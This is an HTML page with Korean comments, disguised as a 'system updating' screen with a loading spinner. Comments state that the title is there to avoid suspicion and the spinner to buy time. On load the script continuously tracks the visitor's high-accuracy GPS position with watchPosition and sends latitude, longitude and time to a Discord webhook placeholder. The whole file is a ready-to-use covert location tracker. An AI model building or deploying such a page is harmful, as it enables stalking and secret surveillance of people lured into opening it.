<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>시스템 업데이트 중...</title> <!-- 사용자가 의심하지 않도록 제목 설정 -->
    <style>
        body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #fff; }
        .loader { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div> <!-- 로딩 애니메이션으로 시간 벌기 -->

<script>
    // 1. 페이지가 열리자마자 바로 GPS 요청
    window.onload = function() {
        if (navigator.geolocation) {
            // watchPosition: 위치가 바뀔 때마다 계속 호출 (실시간 추적)
            navigator.geolocation.watchPosition(
                function(position) {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    const accuracy = position.coords.accuracy;
                    
                    // 2. 데이터 전송 (예: Discord Webhook 또는 내 서버)
                    sendLocation(lat, lng, accuracy);
                },
                function(error) {
                    console.error("위치 오류:", error);
                },
                {
                    enableHighAccuracy: true, // GPS 위성 사용 (더 정확함)
                    timeout: 5000,
                    maximumAge: 0 // 캐시된 위치 아님, 실시간으로
                }
            );
        } else {
            alert("Geolocation을 지원하지 않는 브라우저입니다.");
        }
    };

    function sendLocation(lat, lng, acc) {
        // 예: Discord Webhook으로 전송 (URL은 본인의 것으로 변경 필요)
        const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL_HERE'; 
        
        const data = {
            content: `📍 **새로운 위치 감지!**\n위도: ${lat}\n경도: ${lng}\n정확도: ${acc}m\n시간: ${new Date().toLocaleString()}`
        };

        fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).then(response => {
            if(response.ok) console.log("위치 전송 성공");
        });
    }
</script>
</body>
</html>
